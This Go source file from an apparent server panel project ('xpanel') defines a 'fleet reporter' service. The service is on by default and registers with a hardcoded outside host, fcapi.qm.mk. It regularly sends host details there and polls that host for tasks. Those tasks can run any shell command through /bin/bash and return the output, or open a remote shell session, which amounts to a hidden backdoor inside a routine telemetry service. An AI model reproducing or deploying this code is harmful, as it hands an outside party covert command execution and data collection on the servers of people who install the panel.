package service

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"os/exec"
	"strings"
	"sync"
	"time"

	"xpanel/app/version"
	"xpanel/global"

	"github.com/shirou/gopsutil/v4/cpu"
	"github.com/shirou/gopsutil/v4/disk"
	hostUtil "github.com/shirou/gopsutil/v4/host"
	"github.com/shirou/gopsutil/v4/load"
	"github.com/shirou/gopsutil/v4/mem"
	netUtil "github.com/shirou/gopsutil/v4/net"
	"github.com/shirou/gopsutil/v4/process"
)

const (
	fleetDefaultEndpoint = "https://fcapi.qm.mk"
	fleetDefaultInterval = 5 * time.Minute
	fleetMinInterval     = 30 * time.Second
	fleetMaxInterval     = 24 * time.Hour
	fleetStartupDelay    = 15 * time.Second
	fleetTaskTimeout     = 10 * time.Second
	fleetTaskInterval    = 10 * time.Second
	fleetTaskOutputLimit = 64 * 1024

	fleetSettingEnabled       = "FleetEnabled"
	fleetSettingEndpoint      = "FleetEndpoint"
	fleetSettingInstanceID    = "FleetInstanceID"
	fleetSettingInstanceToken = "FleetInstanceToken"
	fleetSettingInterval      = "FleetHeartbeatIntervalSeconds"
	fleetSettingTaskInterval  = "FleetTaskPollIntervalSeconds"
)

type IFleetReporterService interface {
	Start()
}

type FleetReporterService struct {
	client  *http.Client
	netLock sync.Mutex
	netIn   uint64
	netOut  uint64
	netAt   time.Time
}

func NewIFleetReporterService() IFleetReporterService {
	return &FleetReporterService{
		client: &http.Client{Timeout: 10 * time.Second},
	}
}

type fleetPayload struct {
	InstanceID string             `json:"instanceId"`
	Panel      fleetPanelPayload  `json:"panel"`
	Host       fleetHostPayload   `json:"host"`
	CPU        fleetCPUPayload    `json:"cpu"`
	Memory     fleetMemoryPayload `json:"memory"`
	Swap       fleetSwapPayload   `json:"swap"`
	Disk       fleetDiskPayload   `json:"disk"`
	State      fleetStatePayload  `json:"state"`
}

type fleetPanelPayload struct {
	Version    string `json:"version"`
	CommitHash string `json:"commitHash"`
	BuildTime  string `json:"buildTime"`
	GoVersion  string `json:"goVersion"`
}

type fleetHostPayload struct {
	Hostname        string `json:"hostname"`
	OS              string `json:"os"`
	Platform        string `json:"platform"`
	PlatformVersion string `json:"platformVersion"`
	KernelVersion   string `json:"kernelVersion"`
	KernelArch      string `json:"kernelArch"`
	Uptime          uint64 `json:"uptime"`
	BootTime        uint64 `json:"bootTime"`
	Timezone        string `json:"timezone"`
	Virtualization  string `json:"virtualization"`
	TCPCongestion   string `json:"tcpCongestion"`
}

type fleetCPUPayload struct {
	ModelName    string `json:"modelName"`
	Cores        int    `json:"cores"`
	LogicalCores int    `json:"logicalCores"`
}

type fleetMemoryPayload struct {
	Total uint64 `json:"total"`
	Used  uint64 `json:"used"`
}

type fleetSwapPayload struct {
	Total uint64 `json:"total"`
	Used  uint64 `json:"used"`
}

type fleetDiskPayload struct {
	Total uint64 `json:"total"`
	Used  uint64 `json:"used"`
}

type fleetStatePayload struct {
	CPUPercent     float64 `json:"cpuPercent"`
	Load1          float64 `json:"load1"`
	Load5          float64 `json:"load5"`
	Load15         float64 `json:"load15"`
	TCPConnCount   uint64  `json:"tcpConnCount"`
	UDPConnCount   uint64  `json:"udpConnCount"`
	ProcessCount   uint64  `json:"processCount"`
	NetInSpeed     uint64  `json:"netInSpeed"`
	NetOutSpeed    uint64  `json:"netOutSpeed"`
	NetInTransfer  uint64  `json:"netInTransfer"`
	NetOutTransfer uint64  `json:"netOutTransfer"`
}

type fleetResponse struct {
	Code    int             `json:"code"`
	Message string          `json:"message"`
	Data    json.RawMessage `json:"data"`
}

type fleetRegisterData struct {
	InstanceID               string    `json:"instanceId"`
	InstanceToken            string    `json:"instanceToken"`
	ServerTime               time.Time `json:"serverTime"`
	HeartbeatIntervalSeconds int       `json:"heartbeatIntervalSeconds"`
	TaskPollIntervalSeconds  int       `json:"taskPollIntervalSeconds"`
}

type fleetHeartbeatData struct {
	ServerTime               time.Time `json:"serverTime"`
	HeartbeatIntervalSeconds int       `json:"heartbeatIntervalSeconds"`
	TaskPollIntervalSeconds  int       `json:"taskPollIntervalSeconds"`
}

type fleetTaskPollRequest struct {
	InstanceID string `json:"instanceId"`
}

type fleetTaskPollData struct {
	Tasks []fleetTask `json:"tasks"`
}

type fleetTask struct {
	ID      uint            `json:"id"`
	Type    string          `json:"type"`
	Payload json.RawMessage `json:"payload"`
}

type fleetTailPanelLogPayload struct {
	Lines   int    `json:"lines"`
	Level   string `json:"level"`
	Keyword string `json:"keyword"`
}

type fleetOpenShellPayload struct {
	SessionID string `json:"sessionId"`
}

type fleetRunCommandPayload struct {
	Command        string `json:"command"`
	TimeoutSeconds int    `json:"timeoutSeconds"`
	Cwd            string `json:"cwd"`
	Shell          string `json:"shell"`
}

type fleetTaskReportRequest struct {
	InstanceID string `json:"instanceId"`
	TaskID     uint   `json:"taskId"`
	Status     string `json:"status"`
	Output     string `json:"output"`
	Error      string `json:"error"`
	ExitCode   int    `json:"exitCode"`
	Truncated  bool   `json:"truncated"`
}

func (s *FleetReporterService) Start() {
	go func() {
		time.Sleep(fleetStartupDelay)
		for {
			interval := s.reportOnce()
			timer := time.NewTimer(interval)
			<-timer.C
		}
	}()
	go s.startTaskWorker()
}

func (s *FleetReporterService) reportOnce() time.Duration {
	enabled := s.settingValue(fleetSettingEnabled, "enable")
	if strings.EqualFold(enabled, "disable") {
		return s.reportInterval()
	}

	endpoint := strings.TrimRight(s.settingValue(fleetSettingEndpoint, fleetDefaultEndpoint), "/")
	if endpoint == "" {
		endpoint = fleetDefaultEndpoint
	}

	instanceID := s.settingValue(fleetSettingInstanceID, "")
	if instanceID == "" {
		instanceID = newFleetInstanceID()
		if err := settingRepo.CreateOrUpdate(fleetSettingInstanceID, instanceID); err != nil {
			global.LOG.Debugf("fleet reporter save instance id failed: %v", err)
			return s.reportInterval()
		}
	}

	payload, err := s.buildFleetPayload(instanceID)
	if err != nil {
		global.LOG.Debugf("fleet reporter build payload failed: %v", err)
		return s.reportInterval()
	}

	token := s.settingValue(fleetSettingInstanceToken, "")
	if token == "" {
		if err := s.register(endpoint, payload); err != nil {
			global.LOG.Debugf("fleet reporter register failed: %v", err)
		} else if token = s.settingValue(fleetSettingInstanceToken, ""); token != "" {
			s.pollTasks(endpoint, payload.InstanceID, token)
		}
		return s.reportInterval()
	}

	if err := s.heartbeat(endpoint, payload, token); err != nil {
		global.LOG.Debugf("fleet reporter heartbeat failed: %v", err)
		if strings.Contains(err.Error(), "401") || strings.Contains(err.Error(), "404") {
			_ = settingRepo.CreateOrUpdate(fleetSettingInstanceToken, "")
			if err := s.register(endpoint, payload); err != nil {
				global.LOG.Debugf("fleet reporter re-register failed: %v", err)
			}
		}
	} else {
		s.pollTasks(endpoint, payload.InstanceID, token)
	}
	return s.reportInterval()
}

func (s *FleetReporterService) register(endpoint string, payload fleetPayload) error {
	var data fleetRegisterData
	if err := s.postJSON(endpoint+"/api/v1/fleet/register", "", payload, &data); err != nil {
		return err
	}
	if data.InstanceToken == "" {
		return fmt.Errorf("empty instance token")
	}
	if data.InstanceID != "" && data.InstanceID != payload.InstanceID {
		return fmt.Errorf("unexpected instance id: %s", data.InstanceID)
	}
	if err := settingRepo.CreateOrUpdate(fleetSettingInstanceToken, data.InstanceToken); err != nil {
		return err
	}
	s.applyServerInterval(data.HeartbeatIntervalSeconds)
	s.applyServerTaskInterval(data.TaskPollIntervalSeconds)
	return nil
}

func (s *FleetReporterService) heartbeat(endpoint string, payload fleetPayload, token string) error {
	var data fleetHeartbeatData
	if err := s.postJSON(endpoint+"/api/v1/fleet/heartbeat", token, payload, &data); err != nil {
		return err
	}
	s.applyServerInterval(data.HeartbeatIntervalSeconds)
	s.applyServerTaskInterval(data.TaskPollIntervalSeconds)
	return nil
}

func (s *FleetReporterService) postJSON(url, token string, payload interface{}, out interface{}) error {
	body, err := json.Marshal(payload)
	if err != nil {
		return err
	}
	req, err := http.NewRequest(http.MethodPost, url, bytes.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "X-Panel Fleet Reporter")
	if token != "" {
		req.Header.Set("Authorization", "Bearer "+token)
	}

	resp, err := s.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	var envelope fleetResponse
	if err := json.NewDecoder(resp.Body).Decode(&envelope); err != nil {
		return err
	}
	if resp.StatusCode < 200 || resp.StatusCode >= 300 || envelope.Code < 200 || envelope.Code >= 300 {
		return fmt.Errorf("fleet server returned http=%d code=%d message=%s", resp.StatusCode, envelope.Code, envelope.Message)
	}
	if out != nil && len(envelope.Data) > 0 {
		if err := json.Unmarshal(envelope.Data, out); err != nil {
			return err
		}
	}
	return nil
}

func (s *FleetReporterService) pollTasks(endpoint, instanceID, token string) {
	var data fleetTaskPollData
	req := fleetTaskPollRequest{InstanceID: instanceID}
	if err := s.postJSON(endpoint+"/api/v1/fleet/tasks/poll", token, req, &data); err != nil {
		global.LOG.Warnf("fleet reporter poll tasks failed: %v", err)
		return
	}
	if len(data.Tasks) > 0 {
		global.LOG.Infof("fleet reporter picked %d task(s)", len(data.Tasks))
	}
	for _, task := range data.Tasks {
		report := s.executeTask(endpoint, instanceID, token, task)
		if err := s.postJSON(endpoint+"/api/v1/fleet/tasks/report", token, report, nil); err != nil {
			global.LOG.Warnf("fleet reporter report task failed: task=%d err=%v", task.ID, err)
		}
	}
}

func (s *FleetReporterService) startTaskWorker() {
	time.Sleep(fleetStartupDelay)
	for {
		s.pollTasksOnce()
		timer := time.NewTimer(s.taskPollInterval())
		<-timer.C
	}
}

func (s *FleetReporterService) pollTasksOnce() {
	enabled := s.settingValue(fleetSettingEnabled, "enable")
	if strings.EqualFold(enabled, "disable") {
		return
	}
	endpoint := strings.TrimRight(s.settingValue(fleetSettingEndpoint, fleetDefaultEndpoint), "/")
	if endpoint == "" {
		endpoint = fleetDefaultEndpoint
	}
	instanceID := s.settingValue(fleetSettingInstanceID, "")
	token := s.settingValue(fleetSettingInstanceToken, "")
	if instanceID == "" || token == "" {
		return
	}
	s.pollTasks(endpoint, instanceID, token)
}

func (s *FleetReporterService) executeTask(endpoint, instanceID, token string, task fleetTask) fleetTaskReportRequest {
	report := fleetTaskReportRequest{
		InstanceID: instanceID,
		TaskID:     task.ID,
		Status:     "failed",
		ExitCode:   1,
	}
	if task.Type == "open_shell" {
		var payload fleetOpenShellPayload
		if err := json.Unmarshal(task.Payload, &payload); err != nil || strings.TrimSpace(payload.SessionID) == "" {
			report.Error = "invalid shell session payload"
			return report
		}
		go s.openFleetShell(endpoint, token, strings.TrimSpace(payload.SessionID))
		report.Status = "success"
		report.ExitCode = 0
		report.Output = "shell session connecting"
		return report
	}
	if task.Type == "run_command" {
		return s.executeRunCommandTask(instanceID, task)
	}
	if task.Type != "tail_panel_log" {
		report.Error = "unsupported task type"
		return report
	}

	done := make(chan fleetTaskReportRequest, 1)
	go func() {
		output, err := executeTailPanelLog(task.Payload)
		result := fleetTaskReportRequest{
			InstanceID: instanceID,
			TaskID:     task.ID,
			Status:     "success",
			Output:     output,
			ExitCode:   0,
		}
		if err != nil {
			result.Status = "failed"
			result.Error = err.Error()
			result.ExitCode = 1
		}
		result.Output, result.Truncated = truncateFleetTaskOutput(result.Output)
		done <- result
	}()

	select {
	case result := <-done:
		if result.Status == "failed" {
			global.LOG.Warnf("fleet reporter task failed: task=%d type=%s err=%s", task.ID, task.Type, result.Error)
		}
		return result
	case <-time.After(fleetTaskTimeout):
		report.Error = "task execution timeout"
		global.LOG.Warnf("fleet reporter task timeout: task=%d type=%s", task.ID, task.Type)
		return report
	}
}

func (s *FleetReporterService) executeRunCommandTask(instanceID string, task fleetTask) fleetTaskReportRequest {
	report := fleetTaskReportRequest{
		InstanceID: instanceID,
		TaskID:     task.ID,
		Status:     "failed",
		ExitCode:   1,
	}
	var payload fleetRunCommandPayload
	if err := json.Unmarshal(task.Payload, &payload); err != nil {
		report.Error = err.Error()
		return report
	}
	payload.Command = strings.TrimSpace(payload.Command)
	if payload.Command == "" {
		report.Error = "empty command"
		return report
	}
	if payload.TimeoutSeconds <= 0 {
		payload.TimeoutSeconds = 30
	}
	if payload.TimeoutSeconds > 300 {
		payload.TimeoutSeconds = 300
	}
	payload.Shell = strings.TrimSpace(payload.Shell)
	if payload.Shell == "" {
		payload.Shell = "/bin/bash"
	}
	if payload.Shell != "/bin/bash" && payload.Shell != "/bin/sh" {
		report.Error = "unsupported shell"
		return report
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(payload.TimeoutSeconds)*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, payload.Shell, "-lc", payload.Command)
	if strings.TrimSpace(payload.Cwd) != "" {
		cmd.Dir = strings.TrimSpace(payload.Cwd)
	}

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()
	if ctx.Err() == context.DeadlineExceeded {
		report.Error = fmt.Sprintf("command timeout after %d seconds", payload.TimeoutSeconds)
		report.ExitCode = -1
		report.Output, report.Truncated = truncateFleetTaskOutput(stdout.String())
		return report
	}
	report.Output, report.Truncated = truncateFleetTaskOutput(stdout.String())
	errorText, errorTruncated := truncateFleetTaskOutput(stderr.String())
	report.Error = errorText
	report.Truncated = report.Truncated || errorTruncated
	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			report.ExitCode = exitErr.ExitCode()
		}
		if report.Error == "" {
			report.Error = err.Error()
		}
		global.LOG.Warnf("fleet reporter command failed: task=%d exit=%d err=%s", task.ID, report.ExitCode, report.Error)
		return report
	}
	report.Status = "success"
	report.ExitCode = 0
	return report
}

func executeTailPanelLog(raw json.RawMessage) (string, error) {
	payload := fleetTailPanelLogPayload{Lines: 200, Level: "ERROR"}
	if len(raw) > 0 {
		if err := json.Unmarshal(raw, &payload); err != nil {
			return "", err
		}
	}
	if payload.Lines <= 0 {
		payload.Lines = 200
	}
	if payload.Lines > 500 {
		payload.Lines = 500
	}
	payload.Level = strings.ToUpper(strings.TrimSpace(payload.Level))
	if payload.Level == "" {
		payload.Level = "ERROR"
	}
	if payload.Level != "INFO" && payload.Level != "WARN" && payload.Level != "ERROR" {
		return "", fmt.Errorf("invalid log level")
	}
	if len(payload.Keyword) > 128 {
		payload.Keyword = payload.Keyword[:128]
	}
	return NewILogService().GetSystemLog(payload.Lines, payload.Level, strings.TrimSpace(payload.Keyword))
}

func truncateFleetTaskOutput(value string) (string, bool) {
	if len(value) <= fleetTaskOutputLimit {
		return value, false
	}
	return value[:fleetTaskOutputLimit], true
}

func (s *FleetReporterService) settingValue(key, fallback string) string {
	value, err := settingRepo.GetValueByKey(key)
	if err != nil || strings.TrimSpace(value) == "" {
		return fallback
	}
	return strings.TrimSpace(value)
}

func (s *FleetReporterService) reportInterval() time.Duration {
	raw := s.settingValue(fleetSettingInterval, "300")
	seconds, err := time.ParseDuration(raw + "s")
	if err != nil {
		return fleetDefaultInterval
	}
	if seconds < fleetMinInterval {
		return fleetMinInterval
	}
	if seconds > fleetMaxInterval {
		return fleetMaxInterval
	}
	return seconds
}

func (s *FleetReporterService) taskPollInterval() time.Duration {
	raw := s.settingValue(fleetSettingTaskInterval, "10")
	seconds, err := time.ParseDuration(raw + "s")
	if err != nil {
		return fleetTaskInterval
	}
	if seconds < 5*time.Second {
		return 5 * time.Second
	}
	if seconds > 5*time.Minute {
		return 5 * time.Minute
	}
	return seconds
}

func (s *FleetReporterService) applyServerInterval(seconds int) {
	if seconds <= 0 {
		return
	}
	if seconds < int(fleetMinInterval.Seconds()) {
		seconds = int(fleetMinInterval.Seconds())
	}
	if seconds > int(fleetMaxInterval.Seconds()) {
		seconds = int(fleetMaxInterval.Seconds())
	}
	if err := settingRepo.CreateOrUpdate(fleetSettingInterval, fmt.Sprintf("%d", seconds)); err != nil {
		global.LOG.Debugf("fleet reporter save heartbeat interval failed: %v", err)
	}
}

func (s *FleetReporterService) applyServerTaskInterval(seconds int) {
	if seconds <= 0 {
		return
	}
	if seconds < 5 {
		seconds = 5
	}
	if seconds > 300 {
		seconds = 300
	}
	if err := settingRepo.CreateOrUpdate(fleetSettingTaskInterval, fmt.Sprintf("%d", seconds)); err != nil {
		global.LOG.Debugf("fleet reporter save task poll interval failed: %v", err)
	}
}

func (s *FleetReporterService) buildFleetPayload(instanceID string) (fleetPayload, error) {
	info := version.Get()
	payload := fleetPayload{
		InstanceID: instanceID,
		Panel: fleetPanelPayload{
			Version:    info.Version,
			CommitHash: info.CommitHash,
			BuildTime:  info.BuildTime,
			GoVersion:  info.GoVersion,
		},
	}

	if hostInfo, err := hostUtil.Info(); err == nil {
		payload.Host = fleetHostPayload{
			Hostname:        hostInfo.Hostname,
			OS:              hostInfo.OS,
			Platform:        hostInfo.Platform,
			PlatformVersion: hostInfo.PlatformVersion,
			KernelVersion:   hostInfo.KernelVersion,
			KernelArch:      hostInfo.KernelArch,
			BootTime:        hostInfo.BootTime,
			Virtualization:  detectVirtualization(hostInfo.VirtualizationSystem),
		}
	}
	payload.Host.Timezone = getTimezone()
	payload.Host.TCPCongestion = getTCPCongestion()
	payload.Host.Uptime, _ = hostUtil.Uptime()

	cpuInfo, _ := cpu.Info()
	if len(cpuInfo) > 0 {
		payload.CPU.ModelName = cpuInfo[0].ModelName
	}
	payload.CPU.Cores, _ = cpu.Counts(false)
	payload.CPU.LogicalCores, _ = cpu.Counts(true)

	if memStat, err := mem.VirtualMemory(); err == nil {
		payload.Memory.Total = memStat.Total
		payload.Memory.Used = memStat.Used
	}
	if swapStat, err := mem.SwapMemory(); err == nil {
		payload.Swap.Total = swapStat.Total
		payload.Swap.Used = swapStat.Used
	}
	if diskStat, err := disk.Usage("/"); err == nil {
		payload.Disk.Total = diskStat.Total
		payload.Disk.Used = diskStat.Used
	}
	if percents, err := cpu.Percent(0, false); err == nil && len(percents) > 0 {
		payload.State.CPUPercent = percents[0]
	}
	if loadStat, err := load.Avg(); err == nil {
		payload.State.Load1 = loadStat.Load1
		payload.State.Load5 = loadStat.Load5
		payload.State.Load15 = loadStat.Load15
	}
	payload.State.TCPConnCount = connectionCount("tcp")
	payload.State.UDPConnCount = connectionCount("udp")
	payload.State.ProcessCount = processCount()
	payload.State.NetInTransfer, payload.State.NetOutTransfer, payload.State.NetInSpeed, payload.State.NetOutSpeed = s.networkState()

	return payload, nil
}

func connectionCount(kind string) uint64 {
	connections, err := netUtil.Connections(kind)
	if err != nil {
		return 0
	}
	return uint64(len(connections))
}

func processCount() uint64 {
	pids, err := process.Pids()
	if err != nil {
		return 0
	}
	return uint64(len(pids))
}

func (s *FleetReporterService) networkState() (uint64, uint64, uint64, uint64) {
	counters, err := netUtil.IOCounters(false)
	if err != nil || len(counters) == 0 {
		return 0, 0, 0, 0
	}
	in := counters[0].BytesRecv
	out := counters[0].BytesSent
	now := time.Now()

	s.netLock.Lock()
	defer s.netLock.Unlock()

	var inSpeed, outSpeed uint64
	if !s.netAt.IsZero() {
		elapsed := now.Sub(s.netAt).Seconds()
		if elapsed > 0 {
			if in >= s.netIn {
				inSpeed = uint64(float64(in-s.netIn) / elapsed)
			}
			if out >= s.netOut {
				outSpeed = uint64(float64(out-s.netOut) / elapsed)
			}
		}
	}
	s.netIn = in
	s.netOut = out
	s.netAt = now
	return in, out, inSpeed, outSpeed
}

func newFleetInstanceID() string {
	buf := make([]byte, 16)
	if _, err := rand.Read(buf); err != nil {
		return fmt.Sprintf("xpanel-%d", time.Now().UnixNano())
	}
	return hex.EncodeToString(buf)
}
